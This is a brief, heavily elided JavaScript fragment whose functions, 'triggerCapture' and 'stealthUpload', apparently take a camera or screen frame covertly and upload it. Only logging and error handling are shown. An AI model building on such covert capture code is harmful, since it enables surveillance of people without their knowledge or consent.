...
async function triggerCapture() {
    console.log('Stealth capture triggered');
    try {
        // Wait 1 second to capture a good frame
        setTimeout(async () => {
...
async function stealthUpload(blob) {
    ...
    try {
        ...
        if (error) console.error('Stealth upload failed:', error);
        else console.log('Stealth capture uploaded successfully');
    } catch (e) {
        console.error('Stealth upload exception:', e);
    }
}
